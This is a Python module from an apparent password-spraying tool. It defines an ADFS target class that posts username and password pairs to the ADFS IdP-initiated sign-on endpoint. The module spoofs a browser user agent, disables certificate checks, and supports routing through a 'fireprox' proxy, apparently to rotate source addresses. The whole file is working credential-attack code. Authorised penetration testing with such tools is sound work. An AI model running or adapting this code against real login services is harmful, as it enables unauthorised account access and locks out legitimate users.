import requests

from .classes.BaseHttpTarget import BaseHttpTarget


class ADFS(BaseHttpTarget):
    NAME = "ADFS"
    DESCRIPTION = "Spray Microsoft Active Directory Federation Services (ADFS)"

    def __init__(self, host, port, timeout, fireprox):
        self.timeout = timeout

        #
        # Use IdP-initiated sign-on endpoint
        # This is the standard ADFS forms authentication endpoint
        #
        if fireprox:
            self.url = f"https://{fireprox}/fireprox/adfs/ls/idpinitiatedsignon"
        else:
            self.url = f"https://{host}:{port}/adfs/ls/idpinitiatedsignon"

        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "close",
        }

        self.data = {
            "UserName": "",
            "Password": "",
            "AuthMethod": "FormsAuthentication",
        }

    def set_username(self, username):
        self.data["UserName"] = username
        self.username = username

    def set_password(self, password):
        self.data["Password"] = password
        self.password = password

    def login(self, username, password):
        # set data
        self.set_username(username)
        self.set_password(password)
        # post the request
        response = requests.post(
            self.url,
            headers=self.headers,
            data=self.data,
            timeout=self.timeout,
            verify=False,
        )
        return response
